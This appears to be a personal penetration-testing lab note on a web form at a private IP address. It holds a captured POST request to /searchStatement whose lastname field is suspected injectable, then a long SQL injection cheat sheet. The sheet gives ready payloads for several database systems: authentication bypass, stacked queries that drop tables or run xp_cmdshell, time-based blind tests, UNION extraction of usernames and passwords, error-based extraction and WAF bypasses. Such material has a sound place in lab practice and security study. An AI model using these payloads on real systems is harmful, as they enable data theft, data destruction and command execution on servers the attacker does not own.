### initial web page
![[Pasted image 20250106122936.png]]
### things to try
- `sqlmap`, there is nothing else to try here  other than `sql` - i believe it is the `lastname`

```http
POST /searchStatement HTTP/1.1
Host: 192.168.66.65
Content-Length: 41
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://192.168.66.65
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.66.65/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

easyCode=test&lastname=test&zipcode=test1
```

### tipts to try
```bash
# 🧨 Master Manual SQL Injection Cheat Sheet
# Purpose: Fuzz web apps manually for SQLi across common DBMS types (MySQL, MSSQL, Oracle, PostgreSQL, SQLite)

# ─────────────────────────────
# ✅ 1. BASIC TESTS (Boolean + Syntax)
# ─────────────────────────────
' OR 1=1 --
" OR 1=1 --
') OR ('1'='1
' OR 'a'='a
' AND 1=2 --
' AND 'a'='b
'#
';--
')-- 
" OR ""="

# ─────────────────────────────
# ✅ 2. COMMENT BYPASSES (Syntax-specific)
# ─────────────────────────────
-- -
# (MySQL)
%23
/* comment */
';WAITFOR DELAY '0:0:5'-- (MSSQL Time delay)
';SELECT pg_sleep(5);-- (PostgreSQL Time delay)
';dbms_pipe.receive_message('a',5)-- (Oracle Time delay)

# ─────────────────────────────
# ✅ 3. STACKED QUERIES (Only works if supported)
# ─────────────────────────────
'; SELECT user();--
'; DROP TABLE users; --
'; INSERT INTO users VALUES ('attacker'); --
'; exec xp_cmdshell('whoami')--   # (MSSQL)

# ─────────────────────────────
# ✅ 4. TIME-BASED BLIND (Use to test when no output is shown)
# ─────────────────────────────
' OR IF(1=1, SLEEP(5), 0) --    # MySQL
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--  # PostgreSQL
'; IF (1=1) WAITFOR DELAY '0:0:5'--  # MSSQL
'; BEGIN dbms_lock.sleep(5); END;--  # Oracle

# ─────────────────────────────
# ✅ 5. UNION-BASED ENUMERATION
# ─────────────────────────────
' UNION SELECT NULL,NULL-- 
' UNION SELECT 1,2,3-- 
' UNION SELECT table_name,NULL FROM information_schema.tables-- 
' UNION SELECT username, password FROM users-- 

# Column count test:
ORDER BY 1--
ORDER BY 2--
ORDER BY 10--  # (Keep increasing until error)

# ─────────────────────────────
# ✅ 6. ERROR-BASED PAYLOADS (Use to extract info via DB errors)
# ─────────────────────────────
' AND 1=CONVERT(int, (SELECT @@version))--   # MSSQL
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT user()),0x3a,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a)-- # MySQL
' AND updatexml(null,concat(0x3a,(SELECT version())),null)--   # MySQL (Error function)

# ─────────────────────────────
# ✅ 7. WAF BYPASSES & VARIATIONS
# ─────────────────────────────
'+OR+1=1--
')||(1=1)--
' OR 1=1 LIMIT 1 OFFSET 1--
' OR 'x'='x
0x27206f7220313d312d2d    # Hex encoded ' or 1=1--

# ─────────────────────────────
# ✅ 8. DBMS IDENTIFICATION PAYLOADS
# ─────────────────────────────
# MySQL:
' AND EXISTS(SELECT * FROM mysql.user)--
# PostgreSQL:
' AND EXISTS(SELECT datname FROM pg_database)--
# MSSQL:
' AND EXISTS(SELECT * FROM master..sysdatabases)--
# Oracle:
' AND EXISTS(SELECT * FROM all_tables)--

# ─────────────────────────────
# ✅ 9. SQLite Injection
# ─────────────────────────────
' UNION SELECT sqlite_version(), NULL--
' AND (SELECT COUNT(*) FROM sqlite_master) > 0--

# ─────────────────────────────
# 📌 TIPS FOR USAGE
# ─────────────────────────────
# - Start with basic ' OR 1=1-- and escalate
# - Check for reflected errors, timing differences, and output
# - Watch for different encoding (e.g., URL: %27 OR 1=1-- )
# - Use ORDER BY to find column count before UNION SELECT
# - Use tools like Burp Repeater to quickly test variations

```
